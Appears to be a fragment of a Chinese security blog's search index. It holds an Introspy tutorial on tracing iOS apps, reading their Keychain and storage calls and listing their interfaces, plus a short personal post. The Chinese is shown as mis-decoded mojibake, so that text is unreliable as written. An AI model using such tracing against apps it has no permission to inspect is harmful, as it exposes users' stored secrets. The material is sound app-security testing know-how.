<li>è¿½è¸ªä¿¡æ¯è¢«ä¿å­˜ä¸ºä¸€ä¸ªæ•°æ®åº“<code>introspy-xxxx.db</code>,å­˜æ”¾åœ¨<code>./private/var/mobile/Applications/xxxxx/Library/introspy-com.xxxxx.db</code>ä¸­ï¼Œä½†å®é™…ä¸ŠPPåŠ©æ‰‹ä¸­ä¹Ÿèƒ½æ‰¾åˆ°</li>
</ul>
<p><img src="http://oh5mz2415.bkt.clouddn.com/QQ20161031-3@2x.png" alt="QQ20161031-3@2x"><br><img src="http://oh5mz2415.bkt.clouddn.com/QQ20161031-4@2x.png" alt="QQ20161031-3@2x"></p>
<ul>
<li>ç„¶åæ‰“å¼€<br><a href="https://github.com/iSECPartners/Introspy-Analyzer" target="_blank" rel="external">https://github.com/iSECPartners/Introspy-Analyzer</a><br>å®‰è£…ä¹‹åï¼Œä½ è¦æŠŠæ‰¾åˆ°çš„æ•°æ®åº“æ–‡ä»¶å¯¼å‡ºåˆ°è¿™ä¸ªIntrospy-Analyzer-masteræ–‡ä»¶å¤¹é‡Œï¼Œç„¶åcdåˆ°è¿™ä¸ªæ–‡ä»¶å¤¹</li>
</ul>
<p><img src="http://oh5mz2415.bkt.clouddn.com/F5190147-5504-4854-9FE6-6CDB3DA5066F.png" alt="F5190147-5504-4854-9FE6-6CDB3DA5066F"><br>è¾“å…¥<code>python -m introspy -p ios -o 123 introspy-com.fenbi.tutor.db</code></p>
<blockquote>
<p>æ³¨æ„:<br>   è¿™é‡Œæ˜¯-oä¸æ˜¯-i<br>   è¿™é‡Œçš„123æ˜¯ä½ è‡ªå·±è®¾ç½®çš„å­˜æ”¾ç”Ÿæˆè¿è¡Œæ—¶ä¿¡æ¯çš„æ–‡ä»¶å¤¹</p>
</blockquote>
<p>è¿™æ ·ä¸€æ¥ï¼Œå°±ä¼šåœ¨å½“å‰æ–‡ä»¶å¤¹ä¸‹é¢ç”Ÿæˆä¸€ä¸ªåä¸º123çš„æ–‡ä»¶å¤¹ï¼Œæ‰“å¼€å¯ä»¥çœ‹åˆ°åœ¨æœ¬åœ°æ–‡ä»¶å°†è¯¥æ•°æ®åº“è§£ææˆ report.html</p>
<p><img src="http://oh5mz2415.bkt.clouddn.com/QQ20161031-5@2x.png" alt="QQ20161031-5@2x"></p>
<ul>
<li>æ‰“å¼€report.html<br>æˆ‘ä»¬ä¹Ÿå¯ä»¥çœ‹åˆ°å…¶ä¸­æœ‰ä¸€åˆ—å«åšâ€Potential Findingsâ€ã€‚è¿™äº›éƒ½æ˜¯Introspyè®¤ä¸ºå­˜åœ¨æ¼æ´çš„åœ°æ–¹ã€‚åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å°†çœ‹çœ‹å­˜å‚¨æ•°æ®ä¸å®‰å…¨çš„é—®é¢˜ã€‚ è¿™å¯èƒ½ä¸ç®—æ˜¯ä¸€ä¸ªæ¼æ´ï¼Œå› ä¸ºä¿å­˜çš„ä¿¡æ¯ä¸ä¸€å®šéå¸¸é‡è¦ã€‚</li>
</ul>
<p><img src="http://oh5mz2415.bkt.clouddn.com/521C8D37-A4F2-4A29-96EF-A025C0717B6C.png" alt="521C8D37-A4F2-4A29-96EF-A025C0717B6C"></p>
<ul>
<li>ä¹Ÿå¯ä»¥é€šè¿‡å¦‚ä¸‹è¿™äº›ä¿¡æ¯å¯ä»¥æ‰¾åˆ°æŸappçš„å…¨éƒ¨æ¥å£ä¿¡æ¯ç­‰</li>
</ul>
<p><img src="http://oh5mz2415.bkt.clouddn.com/QQ20161031-8@2x.png" alt="QQ20161031-8@2x"><br><img src="http://oh5mz2415.bkt.clouddn.com/QQ20161031-9@2x.png" alt="QQ20161031-9@2x"></p>
<ul>
<li>ä½ ä¹Ÿå¯ä»¥åœ¨â€™Traced Callsâ€™-â€˜DataStorageâ€™ä¸­é€‰æ‹©åªæŸ¥çœ‹Keychainä¸­çš„ä¿¡æ¯</li>
</ul>
<p><img src="http://oh5mz2415.bkt.clouddn.com/QQ20161031-6@2x.png" alt="QQ20161031-6@2x"></p>
<blockquote>
<p>å½“ç„¶è¿˜å¯ä»¥é€šè¿‡å‘½ä»¤è¡Œç­‰å¯¹ä¿å­˜çš„å‚æ•°è¿›è¡Œåˆ†æï¼Œä½†ç¬”è€…ä¸ªäººè®¤ä¸ºæœ‰ä»¥ä¸Šåˆ†æè¶³å¤Ÿäº†ã€‚<br>å¯¹iosé€†å‘æœ‰å…´è¶£çš„æœ‹å‹æ¨èç‹—ç¥çš„ã€iosåº”ç”¨é€†å‘å·¥ç¨‹ã€‘ä»¥åŠ<a href="http://bbs.iosre.com" target="_blank" rel="external">http://bbs.iosre.com</a></p>
</blockquote>
]]></content>
      
        
        <tags>
            
            <tag> tools </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ç¬¬ä¸€ç¯‡åšå®¢]]></title>
      <url>http://Hello-Sherlock.github.io/2016/11/24/hello-world/</url>
      <content type="html"><![CDATA[<a id="more"></a>
<p>æ—¢ç„¶åšå‡ºäº†é€‰æ‹©ï¼Œæœ€å¥½è¿˜æ˜¯å‡å®šè‡ªå·±æ˜¯å¯¹çš„ï¼Œç„¦è™‘æœªæ¥å’Œåæ‚”è¿‡å»ï¼Œåªç»å†ä¸€ä¸ªå°±å¤Ÿäº†<br>å¦‚æœè¦è¯´é€‰æ‹©ï¼Œå¤§ä¸€çš„iOSå¼€å‘ï¼Œä¹‹åè·Ÿç€@ko0zhiæŒ–æ´ï¼Œåˆä¹‹åè¿›å…¥é€†å‘çš„åœˆå­ï¼Œå¸Œæœ›æˆ‘ä»¬é¢å¯¹æœªçŸ¥ä¸€ç›´ä¿ç•™é‚£ç§å‹‡äºæ¢ç´¢çš„ç²¾ç¥ï¼Œæ„¿ï¼Œä¸å¿˜åˆå¿ƒã€‚</p>
]]></content>
      
        
        <tags>
            
            <tag> éšç¬” </tag>
            
        </tags>
        
    </entry>
    
  
  
</search>
